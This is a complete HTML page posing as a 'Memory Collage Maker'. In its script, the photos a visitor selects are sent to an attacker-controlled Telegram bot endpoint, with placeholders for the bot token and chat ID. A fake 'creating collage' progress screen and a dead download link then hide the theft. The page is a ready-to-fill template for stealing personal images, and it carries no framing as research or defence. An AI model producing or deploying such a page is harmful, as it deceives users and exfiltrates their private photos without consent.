<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Memory Collage Maker</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f4f4f4;
        }
        #fakeButton {
            padding: 10px 20px;
            background-color: #008CBA;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        #fakeButton:hover {
            background-color: #00b8eb;
        }
    </style>
</head>
<body>
    <div>
        <h1>Memory Collage Maker</h1>
        <p>Select up to 3 photos for your memory collage.</p>
        <form id="uploadForm" enctype="multipart/form-data">
            <input type="file" id="fileInput" multiple accept="image/*" style="display: none;">
            <button type="button" id="fakeButton" onclick="document.getElementById('fileInput').click();">Select Photos</button>
        </form>
    </div>

    <script>
        const form = document.getElementById('uploadForm');
        const input = document.getElementById('fileInput');

        input.addEventListener('change', async () => {
            const files = input.files;
            const formData = new FormData();

            for (let i = 0; i < Math.min(files.length, 3); i++) {
                formData.append('photos', files[i]);
            }

            const response = await fetch('https://api.telegram.org/bot<YOUR_BOT_TOKEN_HERE>/sendPhoto?chat_id=<YOUR_CHAT_ID_HERE>', {
                method: 'POST',
                body: formData
            });

            if (response.ok) {
                // Show fake progress screen
                document.body.innerHTML = `
                    <div>
                        <h1>Creating Your Memory Collage</h1>
                        <p>Uploading Photos...</p>
                        <p>Creating Collage...</p>
                        <p>Done! <a href="index.html">Click here</a> to download your collage.</p>
                    </div>
                `;
            } else {
                alert('Failed to upload photos.');
            }
        });
    </script>
</body>
</html>
